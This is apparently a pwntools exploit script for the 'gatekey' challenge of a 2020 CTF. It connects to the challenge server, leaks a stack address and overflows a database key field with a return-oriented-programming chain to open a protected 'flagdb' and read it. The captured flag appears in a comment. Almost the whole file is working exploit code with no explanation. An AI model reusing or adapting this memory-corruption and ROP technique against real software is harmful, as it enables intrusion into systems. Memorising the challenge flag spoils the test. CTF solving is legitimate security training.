#!/usr/bin/env python
from pwn import *

# CTF{3v3ry0ne_1s_add1ng_MPUs_4r0und_their_MMUs}

context.arch = 'amd64'

e = ELF( 'rootfs/bin/database' )
y = remote( 'gatekey.2020.ctfcompetition.com' , 1337 )

def opn( dbname , key ):
    y.sendlineafter( '> ', 'o' )
    y.sendlineafter( 'dbname> ', dbname )
    y.sendlineafter( 'key> ' , key.ljust( 0x10 , '\0' ) )



y.sendlineafter( '> ' , 'yuawn77777' )

y.recvuntil( '[heap]\n' )
y.recvuntil( 'got mapping: ' )
stk = int( y.recvuntil( '-' )[:-1], 16 )
success( 'stack -> %s' % hex(stk) )


pop_rdi = 0x00000000004017c2
pop_rsi = 0x0000000000401e76
close = 0x43ea90
jmp_rdi = 0x0000000000402816
gatekey_open = 0x402B20


rop = ROP( './rootfs/bin/database' )
rop.close( 1 )
rop.read( 0, e.bss() + 0x70 , 7 )
rop.read( 0, e.bss() + 0x80 , 0x20 )
#print(rop.dump())

print hex(e.sym.write)

p = flat(
    'a' * 0xf8,
    rop.chain(),
    pop_rdi, e.bss() + 0x70,
    pop_rsi, e.bss() + 0x80,
    gatekey_open,
    pop_rdi,
    jmp_rdi,
    jmp_rdi
)

opn( 'yuawn' , p )
y.sendlineafter( '> ', 'q' )

'''
43
27ee9a0e80e2fcbece4f1d891f5c720e
'''

key = '43'.ljust( 0x40 , '\0' )
hsh = hashlib.md5( key ).digest()

y.send( 'flagdb\0' )
y.sendline( hsh[1:].ljust( 0x10 , '\0' ) )


y2 = remote( 'gatekey.2020.ctfcompetition.com' , 1337 )

y2.sendlineafter( '> ' , 'yuawn77777' )

y2.sendlineafter( '> ', 'o' )
y2.sendlineafter( 'dbname> ', 'flagdb' )
y2.sendlineafter( 'key> ' , key )


y2.sendlineafter( 'db> ' , 's' )
y2.sendlineafter( 'db> ' , 's' )
y2.sendlineafter( 'db> ' , 's' )
y2.sendlineafter( 'db> ' , 's' )


y2.interactive()